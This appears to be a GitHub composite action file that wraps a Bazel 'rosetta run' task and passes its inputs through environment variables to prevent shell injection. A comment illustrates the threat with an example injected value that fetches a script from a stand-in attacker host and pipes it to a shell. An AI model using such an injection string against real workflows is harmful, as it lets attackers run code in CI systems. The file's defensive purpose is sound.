name: Aspect Workflows
description: |
  Delivers the promised 10x performance benefit of Bazel.
  Auto-scaling "warm" runners, remote cache & exec, CD and more.
branding:
  icon: triangle
  color: gray-dark
inputs:
  workspace:
    description: path from the git repository to the WORKSPACE.bazel file
    required: true
    default: '.'
  task:
    description: the task that we want to generate steps for and then run
    required: true
  args:
    description: additional arguments to be passed to the task instance
    required: false
    default: ''
runs:
  # Declare this is a "Composite Action"
  using: "composite"
  steps:
    # Simple wrapper around running rosetta
    #
    # SECURITY: the inputs are passed through the environment rather than interpolated
    # directly into the `run:` script. GitHub expands `${{ inputs.* }}` textually before
    # the shell sees the script, so a caller passing a `task` or `args` value such as
    # `build; curl attacker.example/x | sh` would have that text executed as shell. By
    # exporting the values into `env:` and referencing them as quoted shell variables,
    # the shell treats them as inert data and a metacharacter can no longer break out
    # of the argument.
    - run: |
        rosetta run \
          --workspace "$WORKSPACE" \
          "$TASK" \
          $ARGS
      shell: bash
      id: rosetta-step
      env:
        WORKSPACE: ${{ inputs.workspace }}
        TASK: ${{ inputs.task }}
        ARGS: ${{ inputs.args }}
